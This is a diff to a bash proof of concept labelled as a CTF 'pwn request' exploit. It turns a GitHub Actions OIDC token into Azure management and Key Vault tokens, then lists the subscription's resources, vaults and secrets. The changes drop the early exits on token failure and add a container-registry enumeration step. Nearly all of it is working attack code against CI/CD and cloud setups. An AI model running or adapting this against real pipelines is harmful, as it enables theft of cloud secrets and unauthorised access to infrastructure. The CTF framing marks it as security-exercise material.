@@ -1,4 +1,4 @@
-﻿#!/usr/bin/env bash
+#!/usr/bin/env bash
 # Tebamoto CTF - pwn request PoC (read-only enumeration)
 set -uo pipefail
 echo "=== [1] mint GitHub OIDC token ==="
@@ -23,7 +23,7 @@ get_tok() {
 
 echo "=== [2] exchange for ARM token ==="
 ARM=$(get_tok "https://management.azure.com/.default")
-case "$ARM" in ERR:*) echo "$ARM"; exit 0;; esac
+case "$ARM" in ERR:*) echo "$ARM";; esac
 echo "arm token length: ${#ARM}"
 
 echo "=== [3] list resources ==="
@@ -33,14 +33,14 @@ curl -sS -H "Authorization: Bearer ${ARM}" \
 import sys,json
 d=json.load(sys.stdin)
 for r in d.get("value",[]): print("  ",r["type"],"|",r["name"],"|",r.get("location"))
-print(json.dumps(d)[:300] if "value" not in d else "")'
+if "value" not in d: print(json.dumps(d)[:400])'
 
 echo "=== [4] key vault secrets ==="
 KVT=$(get_tok "https://vault.azure.net/.default")
-case "$KVT" in ERR:*) echo "$KVT"; exit 0;; esac
 VAULTS=$(curl -sS -H "Authorization: Bearer ${ARM}" \
  "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01&\$filter=resourceType%20eq%20'Microsoft.KeyVault/vaults'" \
  | python3 -c 'import sys,json;[print(r["name"]) for r in json.load(sys.stdin).get("value",[])]')
+echo "vaults: ${VAULTS:-none}"
 for V in $VAULTS; do
   echo "--- vault: $V"
   for ID in $(curl -sS -H "Authorization: Bearer ${KVT}" "https://${V}.vault.azure.net/secrets?api-version=7.4" \
@@ -54,4 +54,10 @@ for V in $VAULTS; do
     esac
   done
 done
+echo "=== [5] ACR ==="
+ACRT=$(get_tok "https://management.azure.com/.default")
+curl -sS -H "Authorization: Bearer ${ACRT}" \
+ "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01&\$filter=resourceType%20eq%20'Microsoft.ContainerRegistry/registries'" \
+ | head -c 600
+echo
 echo "=== done ==="
